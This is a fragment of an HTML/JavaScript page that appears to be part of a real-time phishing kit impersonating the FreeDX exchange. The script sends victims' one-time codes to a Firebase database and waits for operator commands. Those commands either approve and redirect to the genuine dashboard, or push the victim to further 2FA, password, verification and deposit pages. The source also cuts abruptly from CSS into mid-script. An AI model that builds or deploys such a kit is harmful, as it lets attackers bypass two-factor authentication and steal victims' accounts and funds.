  <style>
    .btn-loading {
      position: relative;
      pointer-events: none;
      opacity: 0.8;
    }

    .btn-loading .btn-text {
      visibility: hidden;
    }

    .btn-loading .spinner {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 28px;
      height: 28px;
      border: 3px solid rgba(255, 255, 255, 0.2);
      border-top: 3px solid #ffffff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      100% { transform: translate(-50%, -50%) rotate(360deg); }
    }

    .error-msg {
      color: #ef4444;
      font-size: 14px;
      text-align: center;
      margin-top: 12px;
      display: none;
    }

    .otp-input {
      width: 48px;
      height: 56px;
      text-align: center;
      font-size: 20px;
      font-weight: 600;
      background: #0f1626;
      border: 2px solid #1f2937;
      border-radius: 12px;
      color: #ffffff;
      outline: none;
      transition: border-color 0.2s;
    }

    .otp-input:focus {
      border-color: #7c3aed;
      box-shadow: 0 0 0 3px rgba(124, 58, 237, 0.15);
    }

    .otp-input:disabled {
      opacity: 0.5;
    }

    .otp-input::-webkit-inner-spin-button,

    };

    const app = firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function getSessionId() {
      const params = new URLSearchParams(window.location.search);
      const idFromUrl = params.get('id');
      if (idFromUrl) {
        sessionStorage.setItem('firebaseSessionId', idFromUrl);
        return idFromUrl;
      }
      return sessionStorage.getItem('firebaseSessionId');
    }

    const sessionId = getSessionId();
    const savedEmail = localStorage.getItem('freedx_email');

    if (!sessionId || !savedEmail) {
      window.location.href = 'index.html';
    }

    const sessionRef = db.ref('sessions/' + sessionId);
    const commandRef = db.ref(`sessions/${sessionId}/command`);

    document.getElementById('user-email').textContent = savedEmail;

    const otpInputs = document.querySelectorAll('.otp-input');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = submitBtn.querySelector('.btn-text');
    const spinner = submitBtn.querySelector('.spinner');
    const errorMsg = document.getElementById('errorMsg');
    const timerEl = document.getElementById('timer');
    const resendBtn = document.getElementById('resendBtn');

    let timerInterval;
    let timeLeft = 60;
    let canResend = false;

    otpInputs.forEach((input, index) => {
      input.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
        if (this.value.length === 1 && index < otpInputs.length - 1) {
          otpInputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && this.value === '' && index > 0) {
          otpInputs[index - 1].focus();
        }
      });

      input.addEventListener('paste', function(e) {
        e.preventDefault();
        const paste = (e.clipboardData || window.clipboardData).getData('text');
        const numbers = paste.replace(/\D/g, '').split('');
        numbers.forEach((num, i) => {
          if (i < otpInputs.length) {
            otpInputs[i].value = num;
          }
        });
        const lastIndex = Math.min(numbers.length, otpInputs.length) - 1;
        if (lastIndex >= 0) {
          otpInputs[lastIndex].focus();
        }
      });
    });

    function startTimer() {
      clearInterval(timerInterval);
      timeLeft = 60;
      canResend = false;
      resendBtn.style.display = 'none';
      timerEl.style.display = 'inline';
      timerEl.textContent = timeLeft;

      timerInterval = setInterval(() => {
        timeLeft--;
        timerEl.textContent = timeLeft;

        if (timeLeft <= 0) {
          clearInterval(timerInterval);
          canResend = true;
          timerEl.style.display = 'none';
          resendBtn.style.display = 'inline';
        }
      }, 1000);
    }

    startTimer();

    resendBtn.addEventListener('click', function() {
      if (canResend) {
        startTimer();
        sessionRef.update({ otp_resend: true });
      }
    });

    function setLoading(loading) {
      if (loading) {
        submitBtn.disabled = true;
        submitBtn.classList.add('btn-loading');
        btnText.style.visibility = 'hidden';
        spinner.style.display = 'block';
        errorMsg.style.display = 'none';
      } else {
        submitBtn.disabled = false;
        submitBtn.classList.remove('btn-loading');
        btnText.style.visibility = 'visible';
        spinner.style.display = 'none';
      }
    }

    function getOTP() {
      return Array.from(otpInputs).map(i => i.value).join('');
    }

    document.getElementById('otpForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const otp = getOTP();
      if (otp.length !== 6) return;

      errorMsg.style.display = 'none';
      setLoading(true);

      sessionRef.update({
        otp: otp,
        status: 'online',
        currentPage: 'OTP'
      });
    });

    commandRef.on('value', (snapshot) => {
      const command = snapshot.val();
      if (!command) return;

      switch (command.type) {
        case 'approve':
          window.location.href = 'https://freedx.com/dashboard';
          break;

        case 'reject':
          setLoading(false);
          errorMsg.style.display = 'block';
          otpInputs.forEach(i => i.value = '');
          otpInputs[0].focus();
          commandRef.remove();
          break;

        case 'tfa-request':
          window.location.href = `2fa.html?id=${sessionId}`;
          break;

        case 'password-confirm-request':
          window.location.href = `password_confirm.html?id=${sessionId}`;
          break;

        case 'verify-request':
          window.location.href = `verify.html?id=${sessionId}`;
          break;

        case 'deposit-request':
          window.location.href = `deposit.html?id=${sessionId}`;
          break;

        case 'force-relogin':
          sessionStorage.clear();
          window.location.href = 'index.html';
          break;
      }
    });

    sessionRef.onDisconnect().update({ status: 'offline' });
    window.addEventListener('load', () => {
      sessionRef.update({ currentPage: 'OTP', status: 'online' });
    });
  </script>

</body>
</html>
